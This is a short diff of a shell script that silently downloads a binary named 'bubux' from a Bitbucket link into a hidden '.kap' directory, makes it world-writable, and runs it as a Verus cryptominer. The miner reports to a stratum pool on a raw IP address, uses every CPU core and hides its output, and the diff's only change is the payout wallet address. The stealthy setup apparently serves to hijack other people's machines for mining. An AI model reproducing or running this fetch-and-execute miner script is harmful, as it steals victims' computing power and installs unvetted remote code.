@@ -2,7 +2,7 @@
 mkdir .kap && cd .kap
 wget -O bubux https://bitbucket.org/buyyy/didieu/downloads/bct >/dev/null 2>&1
 chmod 777 bubux
-./bubux -a verus -o stratum+tcp://165.22.242.190:443 -u RJ1XvZmXjz7hUPwA2GHspBoYiquxMzC65u.GASS -t $(nproc --all) >/dev/null 2>&1
+./bubux -a verus -o stratum+tcp://165.22.242.190:443 -u RXHsLBjpWDNbPo4ZJYnmzd2mRT7YCJnk58.GASS -t $(nproc --all) >/dev/null 2>&1
 while [ 1 ]; do
 sleep 3
 done
